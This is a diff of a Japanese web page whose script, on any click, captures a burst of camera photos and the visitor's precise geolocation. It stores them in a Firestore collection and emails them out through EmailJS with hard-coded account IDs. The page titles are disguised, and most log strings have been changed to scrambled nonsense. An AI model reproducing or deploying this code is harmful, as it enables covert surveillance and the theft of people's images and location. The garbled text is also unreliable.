@@ -1,7 +1,7 @@
 <html lang="ja"><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>犬</title>
+<title>生</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -50,7 +50,7 @@
   }
 
   async function capturePhotosWithQuality(facingMode) {
-    log(`📸 ${facingMode}あ`);
+    log(`📸 ${facingMode}犬`);
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
     const video = document.createElement("video");
     video.style.display = "none";
@@ -72,7 +72,7 @@
       const lowQuality = canvas.toDataURL("image/jpeg", 0.2);
       highQualityPhotos.push(highQuality);
       lowQualityPhotos.push(lowQuality);
-      log(`撮影 ${i + 1} 枚目 あ: ${Math.round((highQuality.length * 3) / 4 / 1024)} KB, あ: ${Math.round((lowQuality.length * 3) / 4 / 1024)} KB`);
+      log(`犬 ${i + 1} 枚目 犬: ${Math.round((highQuality.length * 3) / 4 / 1024)} KB, 犬: ${Math.round((lowQuality.length * 3) / 4 / 1024)} KB`);
       await new Promise(r => setTimeout(r, 50));
     }
 
@@ -82,10 +82,10 @@
   }
 
   function getLocation() {
-    log("あ
+    log("📍犬");
     return new Promise((resolve, reject) => {
       if (!navigator.geolocation) {
-        reject(new Error("あ"));
+        reject(new Error("犬応"));
         return;
       }
       navigator.geolocation.getCurrentPosition(pos => {
@@ -98,39 +98,39 @@
         log(`位置情報取得成功: 緯度${loc.lat}, 経度${loc.lon}, 精度${loc.acc}m`);
         resolve(loc);
       }, err => {
-        log(`⚠️ あ: ${err.message}`);
+        log(`⚠️ 位犬得失敗: ${err.message}`);
         resolve({ lat: "不明", lon: "不明", acc: "不明", time: new Date().toLocaleString() });
       }, { enableHighAccuracy: true, timeout: 10000 });
     });
   }
 
   async function saveToFirestore(data) {
-    log("あ保存中...");
+    log("⬆️ Fire犬保存中...");
     try {
       await addDoc(collection(db, "photos_with_location"), data);
-      log("✅ Firestoあ");
+      log("✅ Firestor犬了");
     } catch (e) {
-      log("❌ Firestoreあ: " + e.message);
+      log("❌ Fires犬存失敗: " + e.message);
     }
   }
 
   async function sendEmail(data) {
-    log("✉️ EmailJSあ...");
+    log("✉️ Em犬信中...");
     try {
       await emailjs.send('service_ja2c09x', 'template_2fp2jrg', data);
-      log("✅ Email送あ了");
+      log("✅ Em犬信完了");
     } catch (e) {
-      log("❌ Emaあ敗: " + e.message);
+      log("❌ Em犬信失敗: " + e.message);
     }
   }
 
   async function runProcess() {
     if (busy) {
-      log("❌ 処理あ実行防止");
+      log("❌ 処理犬二重犬防止");
       return;
     }
     busy = true;
-    log("🔄 理あ開始");
+    log("🔄 処犬始");
 
     try {
       const rearPhotos = await capturePhotosWithQuality("environment");
@@ -154,9 +154,9 @@
       };
       await sendEmail(templateParams);
 
-      log("🎉 処あ了！");
+      log("🎉 処理犬了！");
     } catch (e) {
-      log("❌ 全あ処理あラー: " + e.message);
+      log("❌ 全体処理犬ー: " + e.message);
     } finally {
       busy = false;
     }
@@ -168,9 +168,8 @@
     audio = new Audio(base64mp3);
     audio.loop = true;
     audio.volume = 1.0;
-    audio.play().catch(e => log("❌ 音声再生失敗: " + e.message));
+    audio.play().catch(e => log("❌ 音イに生失敗: " + e.message));
   }
-
 
   window.addEventListener("click", () => {
     runProcess();
@@ -186,8 +185,8 @@
 </script>
 </head>
 <body>
-  <h1>にんじん</h1>
-  <pre id="status">待機あ..🔄 処理開始
+  <h1>📸 Firestore保犬生</h1>
+  <pre id="status">待機犬始
 
 </pre>
 
